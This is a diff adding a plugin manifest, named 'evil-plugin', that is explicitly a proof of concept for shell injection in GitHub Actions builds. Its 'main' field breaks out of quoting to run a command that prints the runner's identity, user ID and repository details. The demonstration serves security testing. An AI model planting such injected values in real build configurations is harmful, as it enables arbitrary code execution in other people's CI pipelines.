@@ -1,0 +1,10 @@
+name: evil-plugin
+version: "0.1.0"
+description: "PoC plugin demonstrating GitHub Actions expression injection via build config"
+author: sandbox
+license: MIT
+build:
+  lang: typescript
+  source_dir: .
+  main: '" || echo "::notice::PoC-SHELL-INJECTION-SUCCESS actor=$GITHUB_ACTOR repo=$GITHUB_REPOSITORY run=$GITHUB_RUN_ID whoami=$(whoami) uid=$(id -u)" #'
+  binary_name: test
